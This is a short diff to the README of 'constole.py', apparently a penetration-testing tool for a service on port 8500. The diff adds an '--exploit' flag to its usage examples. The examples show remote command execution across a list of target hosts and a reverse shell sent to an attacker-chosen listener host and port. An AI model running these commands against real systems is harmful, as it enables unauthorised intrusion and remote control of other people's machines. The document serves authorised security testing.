@@ -18,10 +18,10 @@ python constole.py --infile mytargets.txt
 ```
 Remote Code Execution can be achieved across multiple hosts as follows:
 ```
-python constole.py --infile mytargets.txt --cmd 'my command to run'
+python constole.py --infile mytargets.txt --cmd 'my command to run' --exploit
 ```
 To obtain a reverse shell from the vulnerable host, start a netcat listener on your desired port and select a single target:
 ```
-python constole.py --targets 10.50.30.1:8500 --lhost my_ip_address --lport my_listening_nc_port
+python constole.py --targets 10.50.30.1:8500 --lhost my_ip_address --lport my_listening_nc_port --exploit
 ```
 Note that Constole will automatically try to deregister the service, after a time period, to assist in clean up during testing.
